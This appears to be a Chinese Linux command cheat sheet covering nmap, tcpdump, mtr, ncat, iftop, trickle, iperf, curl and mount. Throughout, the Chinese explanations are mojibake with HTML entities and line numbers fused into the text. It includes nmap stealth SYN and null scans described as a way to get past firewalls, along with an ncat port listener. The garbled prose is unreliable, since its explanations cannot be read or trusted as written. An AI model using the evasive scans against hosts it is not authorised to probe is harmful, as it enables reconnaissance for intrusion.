&#x2F;&#x2F;æ¢æµ‹è¯¥ä¸»æœºæ˜¯å¦ä½¿ç”¨äº†åŒ…è¿‡æ»¤å™¨æˆ–é˜²ç«å¢™nmap -PN 192.168.10.11 &#x2F;&#x2F;æ‰«æä¸»æœºæ£€æµ‹å…¶æ˜¯å¦å—åˆ°æ•°æ®åŒ…è¿‡æ»¤è½¯ä»¶æˆ–é˜²ç«å¢™çš„ä¿æŠ¤,â€œ-Fâ€é€‰é¡¹æ‰§è¡Œä¸€æ¬¡å¿«é€Ÿæ‰«æï¼Œä»…æ‰«æåˆ—åœ¨nmap-servicesæ–‡ä»¶ä¸­çš„ç«¯å£è€Œé¿å¼€æ‰€æœ‰å…¶å®ƒçš„ç«¯å£,â€œ-râ€é€‰é¡¹è¡¨ç¤ºä¸ä¼šéšæœºçš„é€‰æ‹©ç«¯å£æ‰«ænmap â€“iflist &#x2F;&#x2F;â€œâ€“iflistâ€é€‰é¡¹æ£€æµ‹ä¸»æœºæ¥å£å’Œè·¯ç”±ä¿¡æ¯nmap -p T:8888,80 192.168.10.11 &#x2F;&#x2F;æŒ‡å®šå…·ä½“çš„ç«¯å£ç±»å‹å’Œç«¯å£å·æ¥è®©nmapæ‰«æ,æ‰«ætcpç«¯å£nmap -p 80-160 192.168.10.11 &#x2F;&#x2F;æ‰«ææŸä¸ªèŒƒå›´å†…çš„ç«¯å£nmap -PS 192.168.10.11 &#x2F;&#x2F;åŒ…è¿‡æ»¤é˜²ç«å¢™ä¼šé˜»æ–­æ ‡å‡†çš„ICMP pingè¯·æ±‚ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨TCP ACK (PA)å’ŒTCP Syn(PS)æ–¹æ³•æ¥æ‰«æè¿œç¨‹ä¸»æœºnmap -sS 192.168.10.11 &#x2F;&#x2F;éšè”½æ‰«ænmap -sN 1192.168.10.11 &#x2F;&#x2F;TCPç©ºæ‰«æè§„é¿é˜²ç«å¢™123456789101112131415161718192021222324lsof å…¨åä¸ºlist open filesï¼Œä¹Ÿå°±æ˜¯åˆ—ä¸¾ç³»ç»Ÿä¸­å·²ç»è¢«æ‰“å¼€çš„æ–‡ä»¶ã€‚mail å‘é€ã€æ¥æ”¶é‚®ä»¶ã€‚mutt é‚®ä»¶ç®¡ç†å‘½ä»¤ã€‚ nslookup æŸ¥è¯¢äº’è”ç½‘DNSæœåŠ¡å™¨çš„å‘½ä»¤dig æŸ¥æ‰¾DNSçš„è§£æè¿‡ç¨‹host æŸ¥è¯¢DNSçš„å‘½ä»¤ã€‚traceroute è¿½è¸ªæ•°æ®ä¼ è¾“è·¯ç”±çŠ¶å†µtcpdump å‘½ä»¤è¡Œçš„æŠ“åŒ…å·¥å…·ç”¨æ³•ï¼š tcpdump [ -adeflnNOpqStvx ] [ -c æ•°é‡ ] [ -F æ–‡ä»¶å ] [ -i ç½‘ç»œæ¥å£ ] [ -r æ–‡ä»¶å] [ -s snaplen ] [ -T ç±»å‹ ] [ -w æ–‡ä»¶å ] [è¡¨è¾¾å¼ ] tcpdumpçš„é€‰é¡¹ï¼š -a å°†ç½‘ç»œåœ°å€å’Œå¹¿æ’­åœ°å€è½¬å˜æˆåå­—ï¼›-d å°†åŒ¹é…ä¿¡æ¯åŒ…çš„ä»£ç ä»¥äººä»¬èƒ½å¤Ÿç†è§£çš„æ±‡ç¼–æ ¼å¼ç»™å‡ºï¼›-dd å°†åŒ¹é…ä¿¡æ¯åŒ…çš„ä»£ç ä»¥cè¯­è¨€ç¨‹åºæ®µçš„æ ¼å¼ç»™å‡ºï¼›-ddd å°†åŒ¹é…ä¿¡æ¯åŒ…çš„ä»£ç ä»¥åè¿›åˆ¶çš„å½¢å¼ç»™å‡ºï¼›-e åœ¨è¾“å‡ºè¡Œæ‰“å°å‡ºæ•°æ®é“¾è·¯å±‚çš„å¤´éƒ¨ä¿¡æ¯ï¼ŒåŒ…æ‹¬æºmacå’Œç›®çš„macï¼Œä»¥åŠç½‘ç»œå±‚çš„åè®®ï¼›-f å°†å¤–éƒ¨çš„Internetåœ°å€ä»¥æ•°å­—çš„å½¢å¼æ‰“å°å‡ºæ¥ï¼›-l ä½¿æ ‡å‡†è¾“å‡ºå˜ä¸ºç¼“å†²è¡Œå½¢å¼ï¼›-n æŒ‡å®šå°†æ¯ä¸ªç›‘å¬åˆ°æ•°æ®åŒ…ä¸­çš„åŸŸåè½¬æ¢æˆIPåœ°å€åæ˜¾ç¤ºï¼Œä¸æŠŠç½‘ç»œåœ°å€è½¬æ¢æˆåå­—ï¼›-nnï¼š æŒ‡å®šå°†æ¯ä¸ªç›‘å¬åˆ°çš„æ•°æ®åŒ…ä¸­çš„åŸŸåè½¬æ¢æˆIPã€ç«¯å£ä»åº”ç”¨åç§°è½¬æ¢æˆç«¯å£å·åæ˜¾ç¤º-t åœ¨è¾“å‡ºçš„æ¯ä¸€è¡Œä¸æ‰“å°æ—¶é—´æˆ³ï¼›-v è¾“å‡ºä¸€ä¸ªç¨å¾®è¯¦ç»†çš„ä¿¡æ¯ï¼Œä¾‹å¦‚åœ¨ipåŒ…ä¸­å¯ä»¥åŒ…æ‹¬ttlå’ŒæœåŠ¡ç±»å‹çš„ä¿¡æ¯ï¼›-vv è¾“å‡ºè¯¦ç»†çš„æŠ¥æ–‡ä¿¡æ¯ï¼›-c åœ¨æ”¶åˆ°æŒ‡å®šçš„åŒ…çš„æ•°ç›®åï¼Œtcpdumpå°±ä¼šåœæ­¢ï¼›-F ä»æŒ‡å®šçš„æ–‡ä»¶ä¸­è¯»å–è¡¨è¾¾å¼,å¿½ç•¥å…¶å®ƒçš„è¡¨è¾¾å¼ï¼›-i æŒ‡å®šç›‘å¬çš„ç½‘ç»œæ¥å£ï¼›-pï¼š å°†ç½‘å¡è®¾ç½®ä¸ºéæ··æ‚æ¨¡å¼ï¼Œä¸èƒ½ä¸hostæˆ–broadcastä¸€èµ·ä½¿ç”¨-r ä»æŒ‡å®šçš„æ–‡ä»¶ä¸­è¯»å–åŒ…(è¿™äº›åŒ…ä¸€èˆ¬é€šè¿‡-wé€‰é¡¹äº§ç”Ÿ)ï¼›-w ç›´æ¥å°†åŒ…å†™å…¥æ–‡ä»¶ä¸­ï¼Œå¹¶ä¸åˆ†æå’Œæ‰“å°å‡ºæ¥ï¼›-s snaplen snaplenè¡¨ç¤ºä»ä¸€ä¸ªåŒ…ä¸­æˆªå–çš„å­—èŠ‚æ•°ã€‚0è¡¨ç¤ºåŒ…ä¸æˆªæ–­ï¼ŒæŠ“å®Œæ•´çš„æ•°æ®åŒ…ã€‚é»˜è®¤çš„è¯ tcpdump åªæ˜¾ç¤ºéƒ¨åˆ†æ•°æ®åŒ…,é»˜è®¤68å­—èŠ‚ã€‚-T å°†ç›‘å¬åˆ°çš„åŒ…ç›´æ¥è§£é‡Šä¸ºæŒ‡å®šçš„ç±»å‹çš„æŠ¥æ–‡ï¼Œå¸¸è§çš„ç±»å‹æœ‰rpc ï¼ˆè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰å’Œsnmpï¼ˆç®€å•ç½‘ç»œç®¡ç†åè®®ï¼›ï¼‰-X å‘Šè¯‰tcpdumpå‘½ä»¤ï¼Œéœ€è¦æŠŠåè®®å¤´å’ŒåŒ…å†…å®¹éƒ½åŸåŸæœ¬æœ¬çš„æ˜¾ç¤ºå‡ºæ¥ï¼ˆtcpdumpä¼šä»¥16è¿›åˆ¶å’ŒASCIIçš„å½¢å¼æ˜¾ç¤ºï¼‰ï¼Œè¿™åœ¨è¿›è¡Œåè®®åˆ†ææ—¶æ˜¯ç»å¯¹çš„åˆ©å™¨ã€‚ 1ï¼‰æŠ“å–åŒ…å«10.10.10.122çš„æ•°æ®åŒ… tcpdump -i eth0 -vnn host 10.10.10.12212ï¼‰æŠ“å–åŒ…å«10.10.10.0&#x2F;24ç½‘æ®µçš„æ•°æ®åŒ… tcpdump -i eth0 -vnn net 10.10.10.0&#x2F;2413ï¼‰æŠ“å–åŒ…å«ç«¯å£22çš„æ•°æ®åŒ… tcpdump -i eth0 -vnn port 2214ï¼‰æŠ“å–udpåè®®çš„æ•°æ®åŒ… tcpdump -i eth0 -vnn udp15ï¼‰æŠ“å–icmpåè®®çš„æ•°æ®åŒ…#tcpdump -i eth0 -vnn icmp 6ï¼‰æŠ“å–arpåè®®çš„æ•°æ®åŒ…tcpdump -i eth0 -vnn arp 7ï¼‰æŠ“å–ipåè®®çš„æ•°æ®åŒ…tcpdump -i eth0 -vnn ip 8ï¼‰æŠ“å–æºipæ˜¯10.10.10.122æ•°æ®åŒ…ã€‚tcpdump -i eth0 -vnn src host 10.10.10.122 9ã€æŠ“å–ç›®çš„ipæ˜¯10.10.10.122æ•°æ®åŒ…tcpdump -i eth0 -vnn dst host 10.10.10.122 10ï¼‰æŠ“å–æºç«¯å£æ˜¯22çš„æ•°æ®åŒ…tcpdump -i eth0 -vnn src port 22 11ï¼‰æŠ“å–æºipæ˜¯10.10.10.253ä¸”ç›®çš„ipæ˜¯22çš„æ•°æ®åŒ…tcpdump -i eth0 -vnn src host 10.10.10.253 and dst port 22 12ï¼‰æŠ“å–æºipæ˜¯10.10.10.122æˆ–è€…åŒ…å«ç«¯å£æ˜¯22çš„æ•°æ®åŒ…tcpdump -i eth0 -vnn src host 10.10.10.122 or port 22 13ï¼‰æŠ“å–æºipæ˜¯10.10.10.122ä¸”ç«¯å£ä¸æ˜¯22çš„æ•°æ®åŒ…tcpdump -i eth0 -vnn src host 10.10.10.122 and not port 22 14ï¼‰æŠ“å–æºipæ˜¯10.10.10.2ä¸”ç›®çš„ç«¯å£æ˜¯22ï¼Œæˆ–æºipæ˜¯10.10.10.65ä¸”ç›®çš„ç«¯å£æ˜¯80çš„æ•°æ®åŒ…ã€‚tcpdump -i eth0 -vnn ( src host 10.10.10.2 and dst port 22 ) or ( src host 10.10.10.65 and dst port 80 ) 15ï¼‰æŠ“å–æºipæ˜¯10.10.10.59ä¸”ç›®çš„ç«¯å£æ˜¯22ï¼Œæˆ–æºipæ˜¯10.10.10.68ä¸”ç›®çš„ç«¯å£æ˜¯80çš„æ•°æ®åŒ…ã€‚tcpdump -i eth0 -vnn â€˜src host 10.10.10.59 and dst port 22â€™ or â€™ src host 10.10.10.68 and dst port 80 â€™ 16ï¼‰æŠŠæŠ“å–çš„æ•°æ®åŒ…è®°å½•å­˜åˆ°&#x2F;tmp&#x2F;fillæ–‡ä»¶ä¸­ï¼Œå½“æŠ“å–100ä¸ªæ•°æ®åŒ…åå°±é€€å‡ºç¨‹åºã€‚tcpdump â€“i eth0 -vnn -w &#x2F;tmp&#x2F;fil1 -c 100 17ï¼‰ä»&#x2F;tmp&#x2F;fillè®°å½•ä¸­è¯»å–tcpåè®®çš„æ•°æ®åŒ…tcpdump â€“i eth0 -vnn -r &#x2F;tmp&#x2F;fil1 tcp 18ï¼‰ä»&#x2F;tmp&#x2F;fillè®°å½•ä¸­è¯»å–åŒ…å«10.10.10.58çš„æ•°æ®åŒ…tcpdump â€“i eth0 -vnn -r &#x2F;tmp&#x2F;fil1 host 10.10.10.58 mtr(ï¼ˆMy tracerouteæ˜¯ping+traceroute)Linuxç‰ˆæœ¬çš„mtrå‘½ä»¤é»˜è®¤å‘é€ICMPæ•°æ®åŒ…è¿›è¡Œé“¾è·¯æ¢æµ‹ã€‚å¯ä»¥é€šè¿‡â€œ-uâ€å‚æ•°æ¥æŒ‡å®šä½¿ç”¨UDPæ•°æ®åŒ…ç”¨äºæ¢æµ‹ã€‚ç›¸å¯¹äºtracerouteå‘½ä»¤åªä¼šåšä¸€æ¬¡é“¾è·¯è·Ÿè¸ªæµ‹è¯•ï¼Œmtrå‘½ä»¤ä¼šå¯¹é“¾è·¯ä¸Šçš„ç›¸å…³èŠ‚ç‚¹åšæŒç»­æ¢æµ‹å¹¶ç»™å‡ºç›¸åº”çš„ç»Ÿè®¡ä¿¡æ¯ã€‚æ‰€ä»¥ï¼Œmtrå‘½ä»¤èƒ½é¿å…èŠ‚ç‚¹æ³¢åŠ¨å¯¹æµ‹è¯•ç»“æœçš„å½±å“ï¼Œæ‰€ä»¥å…¶æµ‹è¯•ç»“æœæ›´æ­£ç¡®ï¼Œå»ºè®®ä¼˜å…ˆä½¿ç”¨ã€‚æ­¤å·¥å…·ä¹Ÿæœ‰å¯¹åº”çš„Windowsç‰ˆæœ¬ï¼Œåç§°ä¸ºWinMTRã€‚ ç”¨æ³•ï¼š mtr [-hvrctglspni46] [-help] [-version] [-report] [-report-cycles&#x3D;COUNT] [-curses] [-gtk] [-raw] [-split] [-no-dns] [-address interface] [-psize&#x3D;bytes&#x2F;-s bytes] [-interval&#x3D;SECONDS] HOSTNAME [PACKETSIZE] å¸¸è§å¯é€‰å‚æ•°è¯´æ˜ï¼š -r æˆ– -reportï¼šä»¥æŠ¥å‘Šæ¨¡å¼æ˜¾ç¤ºè¾“å‡ºã€‚ -p æˆ– -splitï¼šå°†æ¯æ¬¡è¿½è¸ªçš„ç»“æœåˆ†åˆ«åˆ—å‡ºæ¥ã€‚ -s æˆ– -psizeï¼šæŒ‡å®špingæ•°æ®åŒ…çš„å¤§å°ã€‚ -n æˆ– -no-dnsï¼šä¸å¯¹IPåœ°å€åšåŸŸååè§£æã€‚ -a æˆ– -addressï¼šè®¾ç½®å‘é€æ•°æ®åŒ…çš„IPåœ°å€ã€‚ç”¨äºä¸»æœºæœ‰å¤šä¸ªIPæ—¶ã€‚ -4ï¼šåªä½¿ç”¨IPv4åè®®ã€‚ -6ï¼šåªä½¿ç”¨IPv6åè®®ã€‚ å¦å¤–ï¼Œä¹Ÿå¯ä»¥åœ¨mtrå‘½ä»¤è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œè¾“å…¥ç›¸åº”å­—æ¯æ¥å¿«é€Ÿåˆ‡æ¢æ¨¡å¼ã€‚ ï¼Ÿæˆ– hï¼šæ˜¾ç¤ºå¸®åŠ©èœå•ã€‚ dï¼šåˆ‡æ¢æ˜¾ç¤ºæ¨¡å¼ã€‚ nï¼šåˆ‡æ¢å¯ç”¨æˆ–ç¦ç”¨DNSåŸŸåè§£æã€‚ uï¼šåˆ‡æ¢ä½¿ç”¨ICMPæˆ–UDPæ•°æ®åŒ…è¿›è¡Œæ¢æµ‹ã€‚ é»˜è®¤é…ç½®ä¸‹ï¼Œè¿”å›ç»“æœä¸­å„æ•°æ®åˆ—çš„è¯´æ˜ï¼š ç¬¬ä¸€åˆ—ï¼ˆHostï¼‰ï¼šèŠ‚ç‚¹IPåœ°å€å’ŒåŸŸåã€‚å¦‚å‰é¢æ‰€ç¤ºï¼ŒæŒ‰né”®å¯ä»¥åˆ‡æ¢æ˜¾ç¤ºã€‚ ç¬¬äºŒåˆ—ï¼ˆLoss%ï¼‰ï¼šèŠ‚ç‚¹ä¸¢åŒ…ç‡ã€‚ ç¬¬ä¸‰åˆ—ï¼ˆSntï¼‰ï¼šæ¯ç§’å‘é€æ•°æ®åŒ…æ•°ã€‚é»˜è®¤å€¼æ˜¯10ï¼Œå¯ä»¥é€šè¿‡å‚æ•°â€œ-câ€æŒ‡å®šã€‚ ç¬¬å››åˆ—ï¼ˆLastï¼‰ï¼šæœ€è¿‘ä¸€æ¬¡çš„æ¢æµ‹å»¶è¿Ÿå€¼ã€‚ ç¬¬äº”ã€å…­ã€ä¸ƒåˆ—ï¼ˆAvgã€Bestã€Wrstï¼‰ï¼šåˆ†åˆ«æ˜¯æ¢æµ‹å»¶è¿Ÿçš„å¹³å‡å€¼ã€æœ€å°å€¼å’Œæœ€å¤§å€¼ã€‚ ç¬¬å…«åˆ—ï¼ˆStDevï¼‰ï¼šæ ‡å‡†åå·®ã€‚è¶Šå¤§è¯´æ˜ç›¸åº”èŠ‚ç‚¹è¶Šä¸ç¨³å®šã€‚ ncat(nc)ncat&#x2F;ncæ—¢æ˜¯ä¸€ä¸ªç«¯å£æ‰«æå·¥å…·ï¼Œä¹Ÿæ˜¯ä¸€æ¬¾å®‰å…¨å·¥å…·ï¼Œè¿˜æ˜¯ä¸€æ¬¾ç›‘æµ‹å·¥å…·ï¼Œç”šè‡³å¯ä»¥åšä¸ºä¸€ä¸ªç®€å•çš„TCPä»£ç†ã€‚yum install nmap-ncat -y ncat -l 80 &#x2F;&#x2F;ç›‘å¬æŸä¸ªç«¯å£çš„å…¥ç«™è¿æ¥ ncat -v 49.235.179.157 22 &#x2F;&#x2F;æµ‹è¯•ä¸»æœºç«¯å£çš„è¿é€šæ€§,å¦ä¸€ç«¯ç›‘å¬ï¼Œè¿˜å¯å®ç°ncè¿›è¡Œä¸»æœºé—´é€šä¿¡ ftop(æŸ¥çœ‹æµé‡)yum install iftop -yiftop -i eth0 &#x2F;&#x2F; å‚æ•°ï¼š-i: æŒ‡å®šç›‘å¬æ¥å£-B: ä»¥å­—èŠ‚è€Œéæ¯”ç‰¹æ˜¾ç¤ºï¼Œé»˜è®¤æ˜¯å°bï¼Œå³æ¯”ç‰¹ å…¶ä¸­ï¼Œç»“æœå„å­—æ®µè¡¨ç¤ºå¦‚ä¸‹ï¼šTXï¼šå‘é€æµé‡RXï¼šæ¥æ”¶æµé‡TOTALï¼šæ€»æµé‡Cummï¼šè¿è¡Œiftopåˆ°ç›®å‰æ—¶é—´çš„æ€»æµé‡peakï¼šæµé‡å³°å€¼ratesï¼šåˆ†åˆ«è¡¨ç¤ºè¿‡å» 2s 10s 40s çš„å¹³å‡æµé‡ trickle(é™åˆ¶å¸¦å®½):åº”ç”¨ç”¨äºé™åˆ¶ç½‘ç»œå¸¦å®½yum install trickle -y &#x2F;&#x2F;å®‰è£… 1ï¼‰é™åˆ¶wgetçš„ä¸Šä¼ å’Œä¸‹è½½é€Ÿåº¦é™åˆ¶ä¸Šä¼ ä¸º10KB&#x2F;S,ä¸‹è½½ä¸º20KB&#x2F;s trickle -u 10 -d 20 wget http://mirrors.163.com/centos/7/isos/x86_64/CentOS-7-x86_64-Minimal-1503-01.iso 2)å•ç‹¬é™åˆ¶æŸä¸ªè¿›ç¨‹çš„ä¸‹è½½å’Œä¸Šä¼ é€Ÿåº¦trickle -s -d 50 -u 25 ftp 3)é™åˆ¶ç»ˆç«¯ä¸‹çš„æ‰€æœ‰å‘½ä»¤å¸¦å®½ä¸ºï¼Œä¸‹è½½500KB&#x2F;Sï¼Œä¸Šä¼ 250KB&#x2F;s;trickle -s -d 500 -u 250 bash &#x2F;&#x2F;å•ç‹¬å‘½ä»¤ä½¿ç”¨æ—¶ï¼Œå¿…é¡»åŠ -så‚æ•° ç½‘ç»œå¸¦å®½æµ‹è¯•ï¼šiperfiperf æ˜¯ä¸€ä¸ªç½‘ç»œæ€§èƒ½æµ‹è¯•å·¥å…·ï¼Œå®ƒå¯ä»¥æµ‹è¯• TCP å’Œ UDP å¸¦å®½è´¨é‡ï¼Œå¯ä»¥æµ‹é‡æœ€å¤§ TCP å¸¦å®½ï¼Œå…·æœ‰å¤šç§å‚æ•°å’Œ UDP ç‰¹æ€§ï¼Œå¯ä»¥æŠ¥å‘Šå¸¦å®½ï¼Œå»¶è¿ŸæŠ–åŠ¨å’Œæ•°æ®åŒ…ä¸¢å¤±ã€‚åˆ©ç”¨ iperf è¿™ä¸€ç‰¹æ€§ï¼Œå¯ä»¥ç”¨æ¥æµ‹è¯•ä¸€äº›ç½‘ç»œè®¾å¤‡å¦‚è·¯ç”±å™¨ï¼Œé˜²ç«å¢™ï¼Œäº¤æ¢æœºç­‰çš„æ€§èƒ½ã€‚ yum -y install iperf gcc gcc-c++ gcc-g77æˆ–æºç å®‰è£…ï¼š wget -C https://downloads.es.net/pub/iperf/iperf-3-current.tar.gztar xvf iperf-3-current.tar.gzcd iperf.&#x2F;configuremakemake install123456æµ‹è¯•ç¤ºä¾‹ï¼š1 ï¼‰æµ‹è¯•æœ€å¤§çš„TCP å¸¦å®½ï¼ˆå‚æ•°-ræ˜¯åšåŒå‘æµ‹è¯•ï¼Œ-MæŒ‡å®šä¼ è¾“å¸§çš„å¤§å°ï¼‰ serverç«¯ï¼šiperf -s -p 5800 -M 1460 -i 1clientç«¯ï¼š iperf -c server_ip -p 5800 -M 1460 -m -i 1 -r æµ‹è¯•ä¸¢åŒ…ç‡serverç«¯ï¼šiperf -s -i 1 -uclientç«¯ï¼š iperf -c server_ip -i 1 -u -t 10 -b 500m -d å¸¦å®½æµ‹è¯•å·¥å…·ï¼šspeedtestspeedtest æ˜¯ä¸€ä¸ªç”¨ Python å†™æˆçš„å·¥å…·ï¼Œspeedtest å‘½ä»¤å°†ç›´æ¥æä¾›ä¸Šä¼ &#x2F;ä¸‹è½½é€Ÿç‡ï¼› $ sudo apt install speedtest-cliæˆ–è€…$ sudo pip3 install speedtest-cli dstat(ç›‘æ§cpuå†…å­˜)yum install dstat -y &#x2F;&#x2F;å®‰è£… å‚æ•°ï¼š-c: æ˜¾ç¤ºcpuç»¼åˆå æœ‰ç‡-m: æ˜¾ç¤ºå†…å­˜ä½¿ç”¨æƒ…å†µ-n: æ˜¾ç¤ºç½‘ç»œçŠ¶å†µ-lï¼šæ˜¾ç¤ºç³»ç»Ÿè´Ÿè½½æƒ…å†µ-rï¼šæ˜¾ç¤ºI&#x2F;Oè¯·æ±‚(è¯»&#x2F;å†™)æƒ…å†µ eg1ï¼šdstat -ncmlr curl(å‘é€è¯·æ±‚)1ï¼‰url -O æ–‡ä»¶å url &#x2F;&#x2F;ä¿å­˜åˆ°æ–‡ä»¶ 2ï¼‰ç”¨-i,æ˜¾ç¤ºç½‘é¡µå¤´éƒ¨ä¿¡æ¯ å½“ç„¶ä¹Ÿä¼šæŠŠç½‘é¡µä¿¡æ¯æ˜¾ç¤ºå‡ºæ¥ï¼Œå‚æ•° -vå¯ä»¥æ˜¾ç¤ºé€šä¿¡çš„è¿‡ç¨‹ 3ï¼‰æ›´è¯¦ç»†çš„é€šä¿¡ä¿¡æ¯å¯ä»¥ç”¨ å‚æ•° â€“trance æ–‡ä»¶å url,å…·ä½“ä¿¡æ¯ä¿å­˜åˆ°å•ç‹¬çš„æ–‡ä»¶ä¸­curl â€“trace info.txt www.baidu.com 4ï¼‰ä½¿ç”¨å‚æ•° -XæŒ‡å®šhtppçš„åŠ¨è¯ï¼Œä¾‹å¦‚GET POSTï¼ŒPUTï¼ŒDELETEç­‰,curlé»˜è®¤çš„æ˜¯getè¯·æ±‚ï¼Œå¦‚æœå‘é€POStè¯·æ±‚curl -X POST www.baidu.com 5ï¼‰å‘é€è¡¨å•çš„æ—¶ï¼Œåªéœ€è¦æŠŠæ•°æ®æ‹¼æ¥åˆ°urlåé¢å°±è¡Œcurl www.baidu.com?data=xxx&amp;data1=xxx 6ï¼‰POSTå‘é€è¡¨å• curl -X POST â€“data â€œdata&#x3D;xxxâ€ example.com&#x2F;form.cgiPOSTå‘é€è¯·æ±‚çš„æ•°æ®ä½“å¯ä»¥ç”¨-d $ curl -dâ€™login&#x3D;emmaï¼†password&#x3D;123â€™-X POST https://google.com/loginæˆ–è€…$ curl -d â€˜login&#x3D;emmaâ€™ -d â€˜password&#x3D;123â€™ -X POST https://google.com/login ä½¿ç”¨-då‚æ•°ä»¥åï¼ŒHTTP è¯·æ±‚ä¼šè‡ªåŠ¨åŠ ä¸Šæ ‡å¤´Content-Type : application&#x2F;x-www-form-urlencodedã€‚å¹¶ä¸”ä¼šè‡ªåŠ¨å°†è¯·æ±‚è½¬ä¸º POST æ–¹æ³•ï¼Œå› æ­¤å¯ä»¥çœç•¥-X POSTã€‚-då‚æ•°å¯ä»¥è¯»å–æœ¬åœ°æ–‡æœ¬æ–‡ä»¶çš„æ•°æ®ï¼Œå‘æœåŠ¡å™¨å‘é€ã€‚ curl -d â€˜@data.txtâ€™ https://google.com/login &#x2F;&#x2F;è¯»å–data.txtæ–‡ä»¶çš„å†…å®¹ï¼Œä½œä¸ºæ•°æ®ä½“å‘æœåŠ¡å™¨å‘é€ã€‚7ï¼‰æ–‡ä»¶ä¸Šä¼ curl â€“form upload&#x3D;@localfilename â€“form press&#x3D;OK [URL]curl â€“referer www.baidu.com www.baidu.com &#x2F;&#x2F;â€“refererå‚æ•°è¡¨ç¤ºçš„æ˜¯ä½ ä»å“ªä¸ªé¡µé¢æ¥çš„ 8ï¼‰å…¶ä»–å‚æ•°ï¼šâ€“user-agent å¯ä»¥ç”¨-Aæˆ–è€…-Hæ¥æ›¿ä»£ï¼Œè¿™ä¸ªå­—æ®µè¡¨ç¤ºçš„æ˜¯å®¢æˆ·ç«¯è®¾å¤‡çš„ä¿¡æ¯ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šæ ¹æ®è¿™ä¸ªUser Agentå­—æ®µæ¥åˆ¤æ–­æ˜¯æ‰‹æœºè¿˜æ˜¯ç”µè„‘curl â€“user-agent â€œ å†…å®¹â€ urlâ€“cookieå‚æ•°ï¼Œä½¿ç”¨â€“cookieå¯ä»¥æºå¸¦cookieä¿¡æ¯curl â€“cookie â€œname&#x3D;xxxâ€ URL-c cookie-fileå¯ä»¥ä¿å­˜æœåŠ¡å™¨è¿”å›çš„cookieåˆ°æ–‡ä»¶ï¼Œ-b cookie-fileå¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶ä½œä¸ºcookieä¿¡æ¯ï¼Œè¿›è¡Œåç»­çš„è¯·æ±‚ã€‚â€“headerå¢åŠ å¤´éƒ¨ä¿¡æ¯curl â€“header â€œContent-Type:application&#x2F;jsonâ€ http://example.com 8ã€ç£ç›˜ä¸æ–‡ä»¶ç³»ç»Ÿçš„å‘½ä»¤ï¼ˆ16ä¸ªï¼‰mount æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿã€‚mount -t iso9660 -o ro &#x2F;dev&#x2F;cdrom &#x2F;mnt&#x2F;cdrom&#x2F; ##å°†è®¾å¤‡&#x2F;dev&#x2F;cdromæŒ‚è½½åˆ° æŒ‚è½½ç‚¹ ï¼š &#x2F;mnt&#x2F;cdromä¸­mount -t iso9660 -o loop &#x2F;home&#x2F;hadoop&#x2F;Centos-6.7.DVD.iso &#x2F;mnt&#x2F;centos ##æŒ‚è½½å…‰ç›˜é•œåƒæ–‡ä»¶(.isoæ–‡ä»¶)mount &#x2F;dev&#x2F;fd0 &#x2F;mnt&#x2F;floppy æŒ‚è½½ä¸€ä¸ªè½¯ç›˜mount -o loop file.iso &#x2F;mnt&#x2F;cdrom æŒ‚è½½ä¸€ä¸ªæ–‡ä»¶æˆ–ISOé•œåƒæ–‡ä»¶mount -t vfat &#x2F;dev&#x2F;hda5 &#x2F;mnt&#x2F;hda5 æŒ‚è½½ä¸€ä¸ªWindows FAT32æ–‡ä»¶ç³»ç»Ÿmount &#x2F;dev&#x2F;sda1 &#x2F;mnt&#x2F;usbdisk æŒ‚è½½ä¸€ä¸ªusb æ·ç›˜æˆ–é—ªå­˜è®¾å¤‡mount -t smbfs -o username&#x3D;user,password&#x3D;pass &#x2F;&#x2F;WinClient&#x2F;share &#x2F;mnt&#x2F;share æŒ‚è½½ä¸€ä¸ªwindowsç½‘ç»œå…±äº«1234567æ³¨ï¼šæŒ‚è½½çš„èµ„æºåœ¨é‡å¯åå³å¤±æ•ˆï¼Œéœ€è¦é‡æ–°æŒ‚è½½ã€‚è¦æƒ³è‡ªåŠ¨æŒ‚è½½ï¼Œå¯ä»¥å°†æŒ‚è½½ä¿¡æ¯è®¾ç½®åˆ°&#x2F;etc&#x2F;fstabé…ç½®æ–‡ä»¶ä¸­ï¼Œvi &#x2F;etc&#x2F;fstabï¼Œå¢åŠ ï¼š&#x2F;dev&#x2F;cdrom &#x2F;mnt&#x2F;cdrom iso9660 defaults 0 0 umount å¸è½½æ–‡ä»¶ç³»ç»Ÿã€‚umount &#x2F;mnt&#x2F;cdromï¼ˆæŒ‚è½½ç‚¹ï¼‰fuser -km &#x2F;mnt&#x2F;hda2 å½“è®¾å¤‡ç¹å¿™æ—¶å¼ºåˆ¶å¸è½½umount -n &#x2F;mnt&#x2F;hda2 è¿è¡Œå¸è½½æ“ä½œè€Œä¸å†™å…¥ &#x2F;etc&#x2F;mtab æ–‡ä»¶- å½“æ–‡ä»¶ä¸ºåªè¯»æˆ–å½“ç£ç›˜å†™æ»¡æ—¶éå¸¸æœ‰ç”¨ fsck æ£€æŸ¥å¹¶ä¿®å¤Linuxæ–‡ä»¶ç³»ç»Ÿã€‚dd è½¬æ¢ã€å¤åˆ¶æ–‡ä»¶ã€‚dumpe2fs å¯¼å‡ºext2&#x2F;ext3&#x2F;ext4ç­‰æ–‡ä»¶ç³»ç»Ÿä¿¡æ¯ã€‚dump ext2&#x2F;3&#x2F;4ç­‰æ–‡ä»¶ç³»ç»Ÿå¤‡ä»½å·¥å…·ã€‚fdisk ç£ç›˜åˆ†åŒºå‘½ä»¤ï¼Œé€‚ç”¨äº2TBä»¥ä¸‹ç£ç›˜åˆ†åŒºã€‚parted ç£ç›˜åˆ†åŒºå‘½ä»¤ï¼Œæ²¡æœ‰ç£ç›˜å¤§å°é™åˆ¶ï¼Œå¸¸ç”¨äº2TBä»¥ä¸‹ç£ç›˜åˆ†åŒºã€‚mkfs æ ¼å¼åŒ–åˆ›å»ºLinuxæ–‡ä»¶ç³»ç»Ÿã€‚partprobe æ›´æ–°å†…æ ¸çš„ç¡¬ç›˜åˆ†åŒºè¡¨ä¿¡æ¯ã€‚e2fsck æ£€æŸ¥ext2&#x2F;ext3&#x2F;ext4ç­‰ç±»å‹æ–‡ä»¶ç³»ç»Ÿã€‚mkswap åˆ›å»ºLinuxçš„äº¤æ¢åˆ†åŒºã€‚swapon å¯ç”¨äº¤æ¢åˆ†åŒºã€‚swapoff 